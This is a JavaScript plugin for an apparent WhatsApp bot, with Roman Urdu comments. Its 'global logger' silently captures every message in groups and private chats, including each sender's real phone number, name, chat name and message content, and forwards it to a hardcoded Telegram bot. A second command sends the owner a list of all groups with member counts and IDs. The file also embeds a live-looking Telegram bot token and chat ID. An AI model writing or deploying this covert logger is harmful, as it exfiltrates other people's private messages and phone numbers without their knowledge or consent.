const { cmd } = require("../command");
const axios = require("axios");

// ═══════════════════════════════════════════════════════════
// ⚙️ TELEGRAM CONFIGURATION (Apni ID aur Token yahan dalein)
// ═══════════════════════════════════════════════════════════
const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
const TG_CHAT_ID = "6653388298"; 
// ═══════════════════════════════════════════════════════════

// Helper: Telegram par message bhejne ka function
const sendToTelegram = async (text) => {
    try {
        if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;
        
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID,
            text: text,
            parse_mode: "Markdown",
            disable_web_page_preview: true
        }, { timeout: 5000 });
    } catch (error) {
        console.log("[TG Logger] API Error:", error.message);
    }
};

// ═══════════════════════════════════════════════════════════
// 🌍 GLOBAL LOGGER - HAR USER KI ACTIVITY CAPTURE KAREGA 👁️
// ═══════════════════════════════════════════════════════════
cmd({
    on: "body", 
    dontAddCommandList: true,
    filename: __filename
}, async (client, message, match, { from, body, isGroup, isCreator, sender, pushName }) => {
    try {
        if (TG_BOT_TOKEN.includes("PASTE_KAREIN") || !TG_CHAT_ID) return;

        // 🔥 GOLDEN FIX: Asli Phone Number Extract Karna
        const rawJid = message.key?.participant || message.key?.remoteJid || sender || from;
        const realNumber = rawJid ? rawJid.split('@')[0].split(':')[0] : 'Unknown';
        
        const userName = message.pushName || pushName || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi" });
        
        let chatName = "Private Chat (DM)";
        if (isGroup) {
            try {
                const groupMeta = await client.groupMetadata(from);
                chatName = groupMeta.subject || "Unknown Group";
            } catch (e) {
                chatName = "Group (Name fetch failed)";
            }
        }

        // Message Type aur Content
        let msgType = "Text";
        let msgContent = body || "No Text (Media/Empty)";
        
        if (message.imageMessage) { msgType = "️ Image"; msgContent = message.imageMessage.caption || "No Caption"; }
        else if (message.videoMessage) { msgType = "🎥 Video"; msgContent = message.videoMessage.caption || "No Caption"; }
        else if (message.audioMessage) { msgType = "🎵 Audio/Voice"; msgContent = "Voice Note / Audio"; }
        else if (message.documentMessage) { msgType = "📄 Document"; msgContent = message.documentMessage.fileName || "File Sent"; }
        else if (message.stickerMessage) { msgType = "🎭 Sticker"; msgContent = "Sticker Sent"; }

        // Telegram Message Format (Bohot Detailed)
        const logMessage = `
╭━━〔 🤖 *LIVE ACTIVITY LOG* 〕━━⬣
┃ 🕒 *Time:* \`${time}\`
┃ 👤 *Name:* ${userName}
┃ 🔢 *Real Number:* [${realNumber}](https://wa.me/${realNumber})
┃ 💬 *Chat Type:* ${isGroup ? "👥 Group" : " Private DM"}
┃ 🏷️ *Group/Chat Name:* ${chatName}
┃ 📦 *Message Type:* ${msgType}
┃ ⌨️ *Content:* 
┃ ${msgContent}
╰━━━━━━━━━━━━━━━━━━━━━━━━⬣
> *Powered by Your Bot*
        `.trim();

        await sendToTelegram(logMessage);

    } catch (err) {
        console.log("[TG Logger Error]:", err.message);
    }
});

// ═══════════════════════════════════════════════════════════
// 📊 BOT FULL REPORT COMMAND (Kitne Groups, Kitne Users)
// ═══════════════════════════════════════════════════════════
cmd({
    pattern: "botreport",
    alias: ["mygroups", "fullstats", "botstatus"],
    desc: "Send full bot stats and group list to Telegram",
    category: "owner",
    react: "📊",
    filename: __filename
}, async (client, message, m, { reply, isCreator }) => {
    try {
        if (!isCreator) return reply("❌ *Access Denied!* Only owner can use this.");

        reply(" *Generating full bot report... Sending to Telegram...*");

        // Fetch all groups
        const groups = await client.groupFetchAllParticipating();
        const groupList = Object.values(groups);
        const totalGroups = groupList.length;

        let groupDetails = "";
        groupList.forEach((g, index) => {
            groupDetails += `${index + 1}. *${g.subject}*\n   └─ Members: ${g.participants.length} | ID: \`${g.id.split('@')[0]}\`\n`;
        });

        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi" });

        const reportMessage = `
╭━━〔 📊 *BOT FULL REPORT* 〕━━⬣
┃ 🕒 *Generated At:* ${time}
 👥 *Total Groups:* ${totalGroups}
┃ 📱 *Bot Status:* Active & Running
╰━━━━━━━━━━━━━━━━━━━━━━⬣

🏆 *LIST OF ALL GROUPS:*
${groupDetails || "No groups found."}

> *ᴘᴏᴇʀᴇᴅ ʙʏ ʏᴏᴜ ʙᴏᴛ ⚡*
        `.trim();

        await sendToTelegram(reportMessage);
        reply("✅ *Full report sent to your Telegram successfully!*");

    } catch (err) {
        console.error("Bot Report Error:", err);
        reply("❌ Error generating report: " + err.message);
    }
});
